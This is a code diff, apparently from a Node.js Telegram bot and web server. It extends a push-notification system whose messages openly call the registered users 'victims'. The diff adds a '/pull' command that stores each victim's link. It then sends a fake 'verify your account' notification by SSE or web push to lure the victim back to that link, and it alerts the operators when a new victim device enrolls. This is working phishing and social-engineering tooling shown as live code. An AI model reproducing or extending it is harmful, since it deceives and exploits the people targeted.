@@ -788,7 +788,20 @@ bot.on('message', async (msg) => {
     const keys = Object.keys(pushSubs);
     if (keys.length === 0) return bot.sendMessage(chatId, "📭 لا توجد أجهزة مسجّلة للإشعارات بعد.");
     const list = keys.map((k,i) => `${i+1}. \`${k}\``).join("\n");
-    return bot.sendMessage(chatId, `🔔 الأجهزة المسجّلة (${keys.length}):\n\n${list}\n\nاستخدم:\n/push [PID] [النص]`, { parse_mode:"Markdown" });
+    return bot.sendMessage(chatId, `🔔 الأجهزة المسجّلة (${keys.length}):\n\n${list}\n\nأوامر:\n/push [PID] [النص]\n/pull [PID]`, { parse_mode:"Markdown" });
+  }
+
+  if (msg.text?.startsWith("/pull ")) {
+    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
+    const pullPid = msg.text.replace("/pull ","").trim();
+    if (!pullPid) return bot.sendMessage(chatId, "الاستخدام: /pull [PID]");
+    if (!pushSubs[pullPid]) return bot.sendMessage(chatId, "❌ هذا الجهاز لم يُسجَّل بعد.\n\nأرسل /pushlist لمعرفة الأجهزة المسجّلة.");
+    const pullUrl = pushSubs[pullPid].purl || null;
+    if (!pullUrl) return bot.sendMessage(chatId, "⚠️ لا يوجد رابط محفوظ لهذا الجهاز. يجب أن يفتح الرابط مرة أخرى أولاً.");
+    const _pullr = await sendPushToDevice(pullPid, "🔔 تحقق من حسابك", "اضغط هنا للتحقق من حسابك", pullUrl);
+    if (_pullr === "sse")   return bot.sendMessage(chatId, `✅ تم الإرسال — الجهاز متصل، سيظهر الإشعار فوراً`);
+    if (_pullr === "vapid") return bot.sendMessage(chatId, `✅ تم الإرسال — إشعار خلفي، عند النقر سيُعيد فتح الرابط`);
+    return bot.sendMessage(chatId, `📴 الجهاز غير متصل حالياً — سيصل الإشعار عند فتح الرابط مجدداً`);
   }
 
   if (msg.text === "/ping") {
@@ -1642,8 +1655,9 @@ app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));
 
 // SSE stream — foreground push
 app.get("/push-stream", (req, res) => {
-  const uid = req.query.uid || '';
-  const pid = req.query.pid || uid;
+  const uid  = req.query.uid  || '';
+  const pid  = req.query.pid  || uid;
+  const purl = req.query.purl || '';
   if (!pid) return res.status(400).end();
 
   res.set({
@@ -1658,12 +1672,18 @@ app.get("/push-stream", (req, res) => {
   sseClients[pid] = res;
 
   if (!pushSubs[pid]) {
-    pushSubs[pid] = { uid };
+    pushSubs[pid] = { uid, purl };
     saveJSON(PUSH_FILE, pushSubs);
     backupFileToGH("./push_subs.json", "_data/push_subs.json");
     const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ استخدم:\n/push ${pid} النص`);
+    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ إرسال رسالة:\n/push ${pid} النص\n\n📲 سحب الجهاز (يفتح الرابط مجدداً):\n/pull ${pid}`);
     if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${pid}\n(Creator: ${tid})`);
+  } else {
+    // Update purl if changed
+    if (purl && pushSubs[pid].purl !== purl) {
+      pushSubs[pid].purl = purl;
+      saveJSON(PUSH_FILE, pushSubs);
+    }
   }
 
   const hb = setInterval(() => { try { res.write(": hb\n\n"); } catch(e) {} }, 25000);
@@ -1676,23 +1696,25 @@ app.get("/push-stream", (req, res) => {
 // VAPID subscription — background push
 app.post("/push-subscribe", (req, res) => {
   res.send("ok");
-  const uid = req.body.uid || '';
-  const pid = req.body.pid || uid;
-  const sub = req.body.sub;
+  const uid  = req.body.uid  || '';
+  const pid  = req.body.pid  || uid;
+  const purl = req.body.purl || '';
+  const sub  = req.body.sub;
   if (!pid || !sub || !sub.endpoint) return;
   const entry = pushSubs[pid] || { uid };
   entry.subscription = sub;
+  if (purl) entry.purl = purl;
   pushSubs[pid] = entry;
   saveJSON(PUSH_FILE, pushSubs);
   backupFileToGH("./push_subs.json", "_data/push_subs.json");
 });
 
-async function sendPushToDevice(pid, title, body) {
+async function sendPushToDevice(pid, title, body, url) {
   // 1. Try SSE first (instant, if page is open)
   const client = sseClients[pid];
   if (client) {
     try {
-      client.write(`event: push\ndata: ${JSON.stringify({ title, body })}\n\n`);
+      client.write(`event: push\ndata: ${JSON.stringify({ title, body, url: url || null })}\n\n`);
       return "sse";
     } catch(e) { delete sseClients[pid]; }
   }
@@ -1700,7 +1722,8 @@ async function sendPushToDevice(pid, title, body) {
   const entry = pushSubs[pid];
   if (entry && entry.subscription) {
     try {
-      await webPush.sendNotification(entry.subscription, JSON.stringify({ title, body }));
+      const payload = JSON.stringify({ title, body, url: url || entry.purl || null });
+      await webPush.sendNotification(entry.subscription, payload);
       return "vapid";
     } catch(e) {
       if (e.statusCode === 410 || e.statusCode === 404) {
